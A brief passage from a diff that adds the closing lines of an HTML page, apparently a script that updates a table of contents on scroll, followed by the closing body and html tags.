+  window.addEventListener('scroll', updateTOC, { passive: true });
+  updateTOC();
+})();
+</script>
+
+</body>
+</html>
